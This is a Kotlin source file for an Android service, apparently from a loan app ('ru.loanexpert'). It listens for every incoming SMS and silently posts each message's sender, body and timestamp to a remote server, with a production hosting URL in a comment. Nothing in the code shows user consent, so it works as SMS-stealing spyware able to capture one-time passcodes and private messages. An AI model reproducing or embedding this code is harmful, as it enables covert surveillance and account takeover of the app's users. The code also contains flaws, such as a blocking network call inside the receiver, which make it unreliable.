package ru.loanexpert
import android.app.Service
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.os.Bundle
import android.os.IBinder
import android.telephony.SmsMessage
import android.util.Log
import com.facebook.react.bridge.ReactApplicationContext
import com.facebook.react.bridge.ReactContextBaseJavaModule
import com.facebook.react.bridge.ReactMethod
import com.facebook.react.modules.core.DeviceEventManagerModule
import com.facebook.react.modules.network.OkHttpClientProvider
import okhttp3.*
import java.io.IOException

class SmsListenerService : Service() {

    private var smsReceiver: BroadcastReceiver? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startSmsListener()
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? {
        return null
    }

    private fun startSmsListener() {
        val filter = IntentFilter()
        filter.addAction("android.provider.Telephony.SMS_RECEIVED")

        smsReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context?, intent: Intent?) {
                if (intent?.action.equals("android.provider.Telephony.SMS_RECEIVED")) {
                    val bundle: Bundle? = intent?.extras
                    val pdus = bundle?.get("pdus") as Array<*>?
                    pdus?.let {
                        val smsMessage = SmsMessage.createFromPdu(pdus[0] as ByteArray)
                        val messageBody = smsMessage.messageBody
                        val sender = smsMessage.originatingAddress
                        val timestamp = smsMessage.timestampMillis
                        val params = Bundle()
                        params.putString("sender", sender)
                        params.putString("messageBody", messageBody)
                        params.putLong("timestamp", timestamp)
                        //https://gosserveraugust-production.up.railway.app/user/add/message
                        makeHttpPostRequest(params)
                    }
                }
            }
        }
        registerReceiver(smsReceiver, filter)
    }
    private fun makeHttpPostRequest(body: Bundle?) {
        var sender: String? = null
        var messageBody: String? = null
        var timestamp: Long? = null
        body?.let {
        sender = body.getString("sender")
        messageBody = body.getString("messageBody")
        timestamp = body.getLong("timestamp")
        }
        val client = OkHttpClient()
        val formBody = FormBody.Builder()
        .add("sender", sender ?: "")
        .add("messageBody", messageBody ?: "")
        .add("timestamp", timestamp?.toString() ?: "")
        .build()
        Log.d(TAG, "Sender: $sender, Message Body: $messageBody, Timestamp: $timestamp")
        val request = Request.Builder()
            .url("http://192.168.31.31:3000/user/add/message")
            .post(formBody)
            .addHeader("Content-Type", "application/json")
            .build()

        client.newCall(request).execute().use { response ->
        if (!response.isSuccessful) throw IOException("Unexpected code $response")

        println(response.body!!.string())
        }
    }
    override fun onDestroy() {
        unregisterReceiver(smsReceiver)
        super.onDestroy()
    }

    companion object {
        private const val TAG = "ru.loanexpertInfo"
    }
}